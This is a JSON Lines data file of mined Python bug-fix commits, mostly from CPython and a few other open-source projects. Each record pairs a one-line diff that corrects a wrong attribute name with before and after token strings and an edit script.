{"project": "cpython", "commit_sha": "65f0889bfd8fb8514a86c6d9bdab8264909efc0b", "parent_sha": "d7b13e432405a7cf91aa17ef849b3c16a81ecfa7", "file_path": "Lib/test/test_socket_ssl.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ def test_timeout():\n         return\n-    except socket.err, exc:  # In case connection is refused.\n+    except socket.error, exc:  # In case connection is refused.\n         if (isinstance(exc.message, tuple) and\n             exc.message[0] == errno.ECONNREFUSED):\n             raise test_support.TestSkipped(\"test socket connection refused\")\n", "before": "except socket . err , exc : if ( isinstance ( exc . message , tuple ) and exc . message [ 0 ] == errno . ECONNREFUSED ) : raise test_support . TestSkipped ( \"test socket connection refused\" )", "after": "except socket . error , exc : if ( isinstance ( exc . message , tuple ) and exc . message [ 0 ] == errno . ECONNREFUSED ) : raise test_support . TestSkipped ( \"test socket connection refused\" )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:err\", 1, 19, 1, 22], \"error\"]]"}
{"project": "l2InterludeDataPack", "commit_sha": "9b7bf29880d6056cd8d9b5697bf2e6cd64ab7f56", "parent_sha": "a34c65e003d337a91edf530eab670f6cdfe280dc", "file_path": "datapack_development/data/jscript/quests/373_SupplierOfReagents/__init__.py", "project_url": "https://github.com/oonym/l2InterludeDataPack", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -319,7 +319,7 @@ class Quest (JQuest) :\n      for entry in DROPLIST[npcId] :\r\n         item,chance=entry\r\n         if drop < chance :\r\n-           qty=1+st.getRandom(int(Config.RATE_QUESTS_REWARD))\r\n+           qty=1+st.getRandom(int(Config.RATE_DROP_QUEST))\r\n            st.giveItems(item,qty)\r\n            st.playSound(\"ItemSound.quest_itemget\")\r\n            break\r\n", "before": "qty = 1 + st . getRandom ( int ( Config . RATE_QUESTS_REWARD ) )", "after": "qty = 1 + st . getRandom ( int ( Config . RATE_DROP_QUEST ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:RATE_QUESTS_REWARD\", 3, 42, 3, 60], \"RATE_DROP_QUEST\"]]"}
{"project": "cpython", "commit_sha": "147c9a79ed75545e7f52ed1f04d7cf3af96c6156", "parent_sha": "1ea0ae745c3f0338e20c2dddedda44d7943373e9", "file_path": "Lib/test/test_socket.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1103,7 +1103,7 @@ def isTipcAvailable():\n         for line in f:\n             if line.startswith(\"tipc \"):\n                 return True\n-    if test_support.debug:\n+    if test_support.verbose:\n         print \"TIPC module is not loaded, please 'sudo modprobe tipc'\"\n     return False\n \n", "before": "if test_support . debug : print \"TIPC module is not loaded, please 'sudo modprobe tipc'\"", "after": "if test_support . verbose : print \"TIPC module is not loaded, please 'sudo modprobe tipc'\"", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:debug\", 3, 21, 3, 26], \"verbose\"]]"}
{"project": "cpython", "commit_sha": "11f265c20d6e2c15511f7bda6582c45376dc0d2d", "parent_sha": "3d530eeccb8b261f6da9efe5b69ed0dcbf76e6e0", "file_path": "Lib/test/test_io.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -517,7 +517,7 @@ class StatefulIncrementalDecoder(codecs.IncrementalDecoder):\n \n     def __init__(self, errors='strict'):\n-        codecs.IncrementalEncoder.__init__(self, errors)\n+        codecs.IncrementalDecoder.__init__(self, errors)\n         self.reset()\n \n     def __repr__(self):\n", "before": "codecs . IncrementalEncoder . __init__ ( self , errors )", "after": "codecs . IncrementalDecoder . __init__ ( self , errors )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:IncrementalEncoder\", 2, 16, 2, 34], \"IncrementalDecoder\"]]"}
{"project": "cpython", "commit_sha": "7699be56e3fd08e43556ce649708d1c3815af8d4", "parent_sha": "8aa83ef337d4a26925d68288978e00efcd083734", "file_path": "Lib/test/test_socket.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -608,7 +608,7 @@ class GeneralModuleTests(unittest.TestCase):\n         for _, socktype, _, _, _ in infos:\n             self.assertEqual(socktype, socket.SOCK_STREAM)\n         # test proto and flags arguments\n-        socket.getaddrinfo(HOST, None, 0, 0, socket.AI_CANONNAME)\n+        socket.getaddrinfo(HOST, None, 0, 0, socket.SOL_TCP)\n         socket.getaddrinfo(HOST, None, 0, 0, 0, socket.AI_PASSIVE)\n         # a server willing to support both IPv4 and IPv6 will\n         # usually do this\n", "before": "socket . getaddrinfo ( HOST , None , 0 , 0 , socket . AI_CANONNAME )", "after": "socket . getaddrinfo ( HOST , None , 0 , 0 , socket . SOL_TCP )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:AI_CANONNAME\", 3, 53, 3, 65], \"SOL_TCP\"]]"}
{"project": "cpython", "commit_sha": "0b48653dc4aa4ea75552d1465a0358f3b8b2fc8d", "parent_sha": "41a81e3c76ca3e0f11eca125d7672eda2d0b2f5b", "file_path": "Lib/test/test_socket.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -598,7 +598,7 @@ class GeneralModuleTests(unittest.TestCase):\n         for _, socktype, _, _, _ in infos:\n             self.assertEqual(socktype, socket.SOCK_STREAM)\n         # test proto and flags arguments\n-        socket.getaddrinfo(HOST, None, 0, 0, socket.AI_CANONNAME)\n+        socket.getaddrinfo(HOST, None, 0, 0, socket.SOL_TCP)\n         socket.getaddrinfo(HOST, None, 0, 0, 0, socket.AI_PASSIVE)\n         # a server willing to support both IPv4 and IPv6 will\n         # usually do this\n", "before": "socket . getaddrinfo ( HOST , None , 0 , 0 , socket . AI_CANONNAME )", "after": "socket . getaddrinfo ( HOST , None , 0 , 0 , socket . SOL_TCP )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:AI_CANONNAME\", 3, 53, 3, 65], \"SOL_TCP\"]]"}
{"project": "cpython", "commit_sha": "1c8f48efc2554818201a8e707f03c896afe9b896", "parent_sha": "d90e8307959c37b6e16cad2bc780c5dbe5f2c038", "file_path": "Lib/test/test_socket.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -602,7 +602,7 @@ class GeneralModuleTests(unittest.TestCase):\n         for _, socktype, _, _, _ in infos:\n             self.assertEqual(socktype, socket.SOCK_STREAM)\n         # test proto and flags arguments\n-        socket.getaddrinfo(HOST, None, 0, 0, socket.AI_CANONNAME)\n+        socket.getaddrinfo(HOST, None, 0, 0, socket.SOL_TCP)\n         socket.getaddrinfo(HOST, None, 0, 0, 0, socket.AI_PASSIVE)\n         # a server willing to support both IPv4 and IPv6 will\n         # usually do this\n", "before": "socket . getaddrinfo ( HOST , None , 0 , 0 , socket . AI_CANONNAME )", "after": "socket . getaddrinfo ( HOST , None , 0 , 0 , socket . SOL_TCP )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:AI_CANONNAME\", 3, 53, 3, 65], \"SOL_TCP\"]]"}
{"project": "cpython", "commit_sha": "5b5f98f26ead29a949fd0530d11e66b57592910a", "parent_sha": "ae4f53f36bd9b8ab544371ebdfe13b6112333804", "file_path": "Lib/test/test_sys.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -227,7 +227,7 @@ class SysModuleTest(unittest.TestCase):\n \n     def test_getwindowsversion(self):\n         # Raise SkipTest if sys doesn't have getwindowsversion attribute\n-        test.test_support.get_attribute(sys, \"getwindowsversion\")\n+        test.support.get_attribute(sys, \"getwindowsversion\")\n         v = sys.getwindowsversion()\n         self.assertEqual(len(v), 5)\n         self.assertIsInstance(v[0], int)\n", "before": "test . test_support . get_attribute ( sys , \"getwindowsversion\" )", "after": "test . support . get_attribute ( sys , \"getwindowsversion\" )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:test_support\", 3, 14, 3, 26], \"support\"]]"}
{"project": "cpython", "commit_sha": "e0b0a00b087dbd8512fd4a17abe3051413ad3867", "parent_sha": "580d0570315b5cbad600629e6a9c0afd98dd062e", "file_path": "Lib/reprlib.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ def recursive_repr(fillvalue='...'):\n         wrapper.__module__ = getattr(user_function, '__module__')\n         wrapper.__doc__ = getattr(user_function, '__doc__')\n         wrapper.__name__ = getattr(user_function, '__name__')\n-        wrapper.__name__ = getattr(user_function, '__annotations__', {})\n+        wrapper.__annotations__ = getattr(user_function, '__annotations__', {})\n         return wrapper\n \n     return decorating_function\n", "before": "wrapper . __name__ = getattr ( user_function , '__annotations__' , { } )", "after": "wrapper . __annotations__ = getattr ( user_function , '__annotations__' , { } )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:__name__\", 3, 17, 3, 25], \"__annotations__\"]]"}
{"project": "cpython", "commit_sha": "fca8cc848835c661f69a73965901f2d195fb1d23", "parent_sha": "62b411dd5bef93311c73647b8461efd4a059e336", "file_path": "Lib/test/test_zipfile.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -909,7 +909,7 @@ class OtherTests(unittest.TestCase):\n         zipf.close()\n         try:\n             zipf = zipfile.ZipFile(TESTFN, mode=\"r\")\n-        except zipfile.BadZipFile:\n+        except zipfile.BadZipfile:\n             self.fail(\"Unable to create empty ZIP file in 'w' mode\")\n \n         zipf = zipfile.ZipFile(TESTFN, mode=\"a\")\n", "before": "try : zipf = zipfile . ZipFile ( TESTFN , mode = \"r\" ) except zipfile . BadZipFile : self . fail ( \"Unable to create empty ZIP file in 'w' mode\" )", "after": "try : zipf = zipfile . ZipFile ( TESTFN , mode = \"r\" ) except zipfile . BadZipfile : self . fail ( \"Unable to create empty ZIP file in 'w' mode\" )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:BadZipFile\", 3, 24, 3, 34], \"BadZipfile\"]]"}
{"project": "cpython", "commit_sha": "521040bc26d40258aefb7ece1f5c46dc645518eb", "parent_sha": "e598dc670780a314824261bbb121fb4a1f92a59e", "file_path": "Lib/test/test_zipfile.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -956,7 +956,7 @@ class OtherTests(unittest.TestCase):\n         zipf.close()\n         try:\n             zipf = zipfile.ZipFile(TESTFN, mode=\"r\")\n-        except zipfile.BadZipFile:\n+        except zipfile.BadZipfile:\n             self.fail(\"Unable to create empty ZIP file in 'w' mode\")\n \n         zipf = zipfile.ZipFile(TESTFN, mode=\"a\")\n", "before": "try : zipf = zipfile . ZipFile ( TESTFN , mode = \"r\" ) except zipfile . BadZipFile : self . fail ( \"Unable to create empty ZIP file in 'w' mode\" )", "after": "try : zipf = zipfile . ZipFile ( TESTFN , mode = \"r\" ) except zipfile . BadZipfile : self . fail ( \"Unable to create empty ZIP file in 'w' mode\" )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:BadZipFile\", 3, 24, 3, 34], \"BadZipfile\"]]"}
{"project": "cpython", "commit_sha": "0bb02cce6a0b0a0097edbdf892ad384ba1c66978", "parent_sha": "46ff47aeb5b78b4dc0807e4e736dba87011e41f8", "file_path": "Lib/test/test_os.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1282,7 +1282,7 @@ class ProgramPriorityTests(unittest.TestCase):\n             try:\n                 os.setpriority(os.PRIO_PROCESS, os.getpid(), base)\n             except OSError as err:\n-                if err.errno != errno.EACCESS:\n+                if err.errno != errno.EACCES:\n                     raise\n \n \n", "before": "if err . errno != errno . EACCESS : raise", "after": "if err . errno != errno . EACCES : raise", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:EACCESS\", 3, 39, 3, 46], \"EACCES\"]]"}
{"project": "html2text", "commit_sha": "53ec8043222ea8f5e0c902e22938690e0820781f", "parent_sha": "6c32e4f74e581bffac15688c5f7e85641aecea56", "file_path": "html2text.py", "project_url": "https://github.com/oasiswork/html2text", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -290,7 +290,7 @@ class _html2text(HTMLParser.HTMLParser):\n         self.pbr()\n         self.o('', 0, 'end')\n \n-        self.outtext = self.outtext.join(self.outtestlist)\n+        self.outtext = self.outtext.join(self.outtextlist)\n         \n         if options.google_doc:\n             self.outtext = self.outtext.replace('&nbsp_place_holder;', ' ');\n", "before": "self . outtext = self . outtext . join ( self . outtestlist )", "after": "self . outtext = self . outtext . join ( self . outtextlist )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:outtestlist\", 3, 47, 3, 58], \"outtextlist\"]]"}
{"project": "pyload", "commit_sha": "265840a2448ec3c87594b3a73e95a364f85aa23b", "parent_sha": "19d7330d35ce8cb234d47c22b4454482ef3f1d8a", "file_path": "module/utils/fs.py", "project_url": "https://github.com/SeppPenner/pyload", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,4 +69,4 @@ def free_space(folder):\n         from os import statvfs\n \n         s = statvfs(folder)\n-        return s.f_bsize * s.f_bavail\n+        return s.f_frsize * s.f_bavail\n", "before": "return s . f_bsize * s . f_bavail", "after": "return s . f_frsize * s . f_bavail", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:f_bsize\", 3, 18, 3, 25], \"f_frsize\"]]"}
{"project": "pyload", "commit_sha": "30745aab8b7e42b32f8394e15427b38271dad17e", "parent_sha": "a03ece96ae83e8fedb27fdb297c52a8e6b111d55", "file_path": "module/FileManager.py", "project_url": "https://github.com/SeppPenner/pyload", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -337,7 +337,7 @@ class FileManager:\n \n         for pack in self.cachedPackages():\n             if pack.root == root and pack.packageorder > oldorder:\n-                pack.order -= 1\n+                pack.packageorder -= 1\n \n         self.evm.dispatchEvent(\"packageDeleted\", pid)\n \n", "before": "pack . order -= 1", "after": "pack . packageorder -= 1", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:order\", 3, 22, 3, 27], \"packageorder\"]]"}
{"project": "pulp_rpm", "commit_sha": "4eefacfe71ec6ad57dfe0a55b6aec0fa0eba2eb9", "parent_sha": "08ceb8f97aabfde2f1dc870577e84b3da15e6fa6", "file_path": "plugins/pulp_rpm/plugins/importers/yum/sync.py", "project_url": "https://github.com/pcreech/pulp_rpm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -584,7 +584,7 @@ class RepoSync(object):\n             entry.importer_id = str(self.conduit.importer_object_id)\n             entry.unit_id = unit.id\n             entry.unit_type_id = unit.type_id\n-            entry.url = urljoin(base_url, unit.filename)\n+            entry.url = urljoin(base_url, unit.relativepath)\n             entry.save_revision()\n             yield unit\n \n", "before": "entry . url = urljoin ( base_url , unit . filename )", "after": "entry . url = urljoin ( base_url , unit . relativepath )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:filename\", 3, 48, 3, 56], \"relativepath\"]]"}
{"project": "pyload", "commit_sha": "533ae350a5a025e0d9c3a485a1d97e254cfe4552", "parent_sha": "24e34b35a00a784e7720c37f4459fc01577c76f4", "file_path": "src/pyload/core/config/default.py", "project_url": "https://github.com/SeppPenner/pyload", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ def _gen_config_defaults():\n         ('logfile_size', ('option', 100, 'Max file size (in KiB)',\n                           None, None, InputType.Size)),\n         ('logfile_folder', ('option', None, 'File folder',\n-                            None, None, InputType.Foider)),\n+                            None, None, InputType.Folder)),\n         ('logfile_name', ('option', None, 'File name',\n                           None, None, InputType.File)),\n         ('max_logfiles', ('option', 5, 'Max log files',\n", "before": "( 'logfile_folder' , ( 'option' , None , 'File folder' , None , None , InputType . Foider ) ) ,", "after": "( 'logfile_folder' , ( 'option' , None , 'File folder' , None , None , InputType . Folder ) ) ,", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:Foider\", 3, 51, 3, 57], \"Folder\"]]"}
{"project": "cpython", "commit_sha": "50d24a024bb27b64dd19481bba5cd0c8aadb4c6f", "parent_sha": "56780a0df55cdddc6d4f3d5a94518b137520763f", "file_path": "Lib/chunk.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -106,7 +106,7 @@ class Chunk:\n         if whence == 1:\n             pos = pos + self.size_read\n         elif whence == 2:\n-            pos = pos + self.chunk_size\n+            pos = pos + self.chunksize\n         if pos < 0 or pos > self.chunksize:\n             raise RuntimeError\n         self.file.seek(self.offset + pos, 0)\n", "before": "pos = pos + self . chunk_size", "after": "pos = pos + self . chunksize", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:chunk_size\", 3, 30, 3, 40], \"chunksize\"]]"}
{"project": "cpython", "commit_sha": "4d6ea208ccc7e96b6a889ce8478894844405727d", "parent_sha": "94f57006e39af82e7201b71c2ff41d2b45a44e30", "file_path": "Lib/distutils/command/bdist_rpm.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -189,7 +189,7 @@ class bdist_rpm (Command):\n         if type(self.doc_files) is ListType:\n             for readme in ('README', 'README.txt'):\n                 if os.path.exists(readme) and readme not in self.doc_files:\n-                    self.doc.append(readme)\n+                    self.doc_files.append(readme)\n \n         self.ensure_string('release', \"1\")\n         self.ensure_string('serial')   # should it be an int?\n", "before": "self . doc . append ( readme )", "after": "self . doc_files . append ( readme )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:doc\", 3, 26, 3, 29], \"doc_files\"]]"}
{"project": "cpython", "commit_sha": "60dbde55243c5d8243a5495f0a28661b531ccce6", "parent_sha": "9b754359c2a89e4696d6961025d919c0a7b3634d", "file_path": "Lib/email/Charset.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -348,7 +348,7 @@ class Charset:\n         # 7bit/8bit encodings return the string unchanged (module conversions)\n         if self.body_encoding is BASE64:\n             return email.base64MIME.body_encode(s)\n-        elif self.header_encoding is QP:\n+        elif self.body_encoding is QP:\n             return email.quopriMIME.body_encode(s)\n         else:\n             return s\n", "before": "if self . body_encoding is BASE64 : return email . base64MIME . body_encode ( s ) elif self . header_encoding is QP : return email . quopriMIME . body_encode ( s ) else : return s", "after": "if self . body_encoding is BASE64 : return email . base64MIME . body_encode ( s ) elif self . body_encoding is QP : return email . quopriMIME . body_encode ( s ) else : return s", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:header_encoding\", 3, 19, 3, 34], \"body_encoding\"]]"}
{"project": "cpython", "commit_sha": "eaa64984f556b5bab8b31ff45dbacbcd8ad65274", "parent_sha": "55faa15c804b397ba83635e113edeb3e71e630f6", "file_path": "Mac/Lib/EasyDialogs.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -277,7 +277,7 @@ class ProgressBar:\n \t\t\t\t\traise KeyboardInterrupt, ev\n \t\t\telse:\n \t\t\t\tif part == 4:\t# inDrag \n-\t\t\t\t\tself.d.DragWindow(where, screenbounds)\n+\t\t\t\t\tself.w.DragWindow(where, screenbounds)\n \t\t\t\telse:\n \t\t\t\t\tMacOS.HandleEvent(ev) \n \t\t\t\n", "before": "else : if part == 4 : self . d . DragWindow ( where , screenbounds )", "after": "else : if part == 4 : self . w . DragWindow ( where , screenbounds )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:d\", 3, 11, 3, 12], \"w\"]]"}
{"project": "cpython", "commit_sha": "fbefc4bc4aa52be7fe54a11b50ee6e2b382620c9", "parent_sha": "43015921c86ce98a2bc1287a28666324dddc931a", "file_path": "Lib/mimetypes.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -193,7 +193,7 @@ def init(files=None):\n         if os.path.isfile(file):\n             db.readfp(open(file))\n     encodings_map = db.encodings_map\n-    suffix_map = db.encodings_map\n+    suffix_map = db.suffix_map\n     types_map = db.types_map\n     guess_extension = db.guess_extension\n     guess_type = db.guess_type\n", "before": "suffix_map = db . encodings_map", "after": "suffix_map = db . suffix_map", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:encodings_map\", 3, 21, 3, 34], \"suffix_map\"]]"}
{"project": "cpython", "commit_sha": "b7c340f5326650f20bce713f7968e7d8683754e1", "parent_sha": "4008b1e3c3f33864d32306bc7d82d497ef74c24e", "file_path": "Lib/BaseHTTPServer.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -218,7 +218,7 @@ class BaseHTTPRequestHandler(SocketServer.StreamRequestHandler):\n \n-        The request should be stored in self.raw_request; the results\n+        The request should be stored in self.raw_requestline; the results\n         are in self.command, self.path, self.request_version and\n         self.headers.\n \n", "before": "stored in self . raw_request", "after": "stored in self . raw_requestline", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:raw_request\", 1, 46, 1, 57], \"raw_requestline\"]]"}
{"project": "cpython", "commit_sha": "9b1be4f2e4f1ce1895501171f7d518c568050152", "parent_sha": "3fe60881fb50841663f6c1cee2a12428496be75f", "file_path": "Lib/posixpath.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ def getmtime(filename):\n def getatime(filename):\n     \"\"\"Return the last access time of a file, reported by os.stat().\"\"\"\n     st = os.stat(filename)\n-    return st[stat.ST_MTIME]\n+    return st[stat.ST_ATIME]\n \n \n # Is a path a symbolic link?\n", "before": "return st [ stat . ST_MTIME ]", "after": "return st [ stat . ST_ATIME ]", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:ST_MTIME\", 3, 20, 3, 28], \"ST_ATIME\"]]"}
{"project": "rapidsms", "commit_sha": "d26b3ccd9dd5369078b1eb4f8920100397140e07", "parent_sha": "d681d208e42758fba55c902784b34cfdc877ed96", "file_path": "lib/rapidsms/router.py", "project_url": "https://github.com/maniacs-satm/rapidsms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class Router (component.Receiver):\n \n     def add_app (self, conf):\n         app = self.build_component(\"apps.%s.app.App\", conf)\n-        self.backends.append(app)\n+        self.apps.append(app)\n     \n     def start_backend (self, backend):\n         while self.running:\n", "before": "self . backends . append ( app )", "after": "self . apps . append ( app )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:backends\", 3, 14, 3, 22], \"apps\"]]"}
{"project": "rapidsms", "commit_sha": "16a035dc507b49b1d395fcadfc825b8e18b6fb14", "parent_sha": "b03c28cdfe8d5e906b50fc2e9bae34ab382f19ea", "file_path": "lib/rapidsms/router.py", "project_url": "https://github.com/maniacs-satm/rapidsms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class Router (component.Receiver):\n \n     def add_app (self, conf):\n         app = self.build_component(\"apps.%s.app.App\", conf)\n-        self.backends.append(app)\n+        self.apps.append(app)\n     \n     def start_backend (self, backend):\n         while self.running:\n", "before": "self . backends . append ( app )", "after": "self . apps . append ( app )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:backends\", 3, 14, 3, 22], \"apps\"]]"}
{"project": "rapidsms", "commit_sha": "43cfe9ade74ef75b1e16d8d51f361ab330f0bc9e", "parent_sha": "28b6f0c2e243996110631b33b25ade2920490e63", "file_path": "lib/rapidsms/backends/irc.py", "project_url": "https://github.com/maniacs-satm/rapidsms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class Backend(rapidsms.backends.Backend):\n         if channel:\n             target = channel\n         else:\n-            target = msg.cconnection.identity\n+            target = msg.connection.identity\n         response = \"%s: %s\" % (msg.connection.identity, msg.text)\n         self.info(\"sending to %s: %s\", target, response)\n         self.server.privmsg(target, response)\n", "before": "target = msg . cconnection . identity", "after": "target = msg . connection . identity", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:cconnection\", 3, 26, 3, 37], \"connection\"]]"}
{"project": "rapidsms", "commit_sha": "3a929489a56fd02da7904dcb078dd1bd2756aec8", "parent_sha": "b427766fe71406111fb7159fa90804e5cb026ea3", "file_path": "lib/rapidsms/backends/irc.py", "project_url": "https://github.com/maniacs-satm/rapidsms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -42,7 +42,7 @@ class Backend(rapidsms.backends.Backend):\n         if channel:\n             target = channel\n         else:\n-            target = msg.cconnection.identity\n+            target = msg.connection.identity\n         response = \"%s: %s\" % (msg.connection.identity, msg.text)\n         self.info(\"sending to %s: %s\", target, response)\n         self.server.privmsg(target, response)\n", "before": "target = msg . cconnection . identity", "after": "target = msg . connection . identity", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:cconnection\", 3, 26, 3, 37], \"connection\"]]"}
{"project": "cpython", "commit_sha": "6d471175178627971cbde5cc96468d2d19db5748", "parent_sha": "990d8f14d9cac1603438a2564adf715bea053705", "file_path": "Lib/distutils/command/bdist_rpm.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -298,7 +298,7 @@ class bdist_rpm (Command):\n \n         # Make a source distribution and copy to SOURCES directory with\n         # optional icon.\n-        saved_dist_files = self.distributuion.dist_files[:]\n+        saved_dist_files = self.distribution.dist_files[:]\n         sdist = self.reinitialize_command('sdist')\n         if self.use_bzip2:\n             sdist.formats = ['bztar']\n", "before": "saved_dist_files = self . distributuion . dist_files [ : ]", "after": "saved_dist_files = self . distribution . dist_files [ : ]", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:distributuion\", 3, 33, 3, 46], \"distribution\"]]"}
{"project": "cpython", "commit_sha": "3401e18d68a7f2775e11fcfbe5e1c266e70e2f70", "parent_sha": "3b1f78ed52e83aff73f21233368292fb88561cde", "file_path": "Lib/codecs.py", "project_url": "https://github.com/OffByOneStudios/cpython", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -233,7 +233,7 @@ class BufferedIncrementalDecoder(IncrementalDecoder):\n \n     def reset(self):\n         IncrementalDecoder.reset(self)\n-        self.bytebuffer = \"\"\n+        self.buffer = \"\"\n \n #\n # The StreamWriter and StreamReader class provide generic working\n", "before": "self . bytebuffer = \"\"", "after": "self . buffer = \"\"", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:bytebuffer\", 3, 14, 3, 24], \"buffer\"]]"}
{"project": "pony", "commit_sha": "1c5c2394029b152d74b2e5dee9ca73e951a9783d", "parent_sha": "48e6971c4103c790746d826ffac28040763a682f", "file_path": "pony/db.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -351,6 +351,6 @@ def db_decorator(func, *args, **keyargs):\n     allowed_exceptions = web and [ web.HttpRedirect ] or []\r\n     try: return with_transaction(func, args, keyargs, allowed_exceptions)\r\n     except RowNotFound:\r\n-        if web: raise web.HttpNotFound\r\n+        if web: raise web.Http404NotFound\r\n         raise\r\n     \n\\ No newline at end of file\n", "before": "raise web . HttpNotFound", "after": "raise web . Http404NotFound", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:HttpNotFound\", 3, 27, 3, 39], \"Http404NotFound\"]]"}
{"project": "pony", "commit_sha": "844ec133927bb43bcf4a7fa9fd388e791cb22a55", "parent_sha": "ad3d28fe53ce520b5c79d9bb9a21483ac70846b9", "file_path": "pony/dbproviders/oracle.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ paramstyle = 'named'\n \r\n class Param(dbapiprovider.Param):\r\n     def __unicode__(self):\r\n-        return ':p%d' % self.index\r\n+        return ':p%d' % self.param_key\r\n \r\n class OracleBuilder(dbapiprovider.SQLBuilder):\r\n     param = Param\r\n", "before": "return ':p%d' % self . index", "after": "return ':p%d' % self . param_key", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:index\", 3, 30, 3, 35], \"param_key\"]]"}
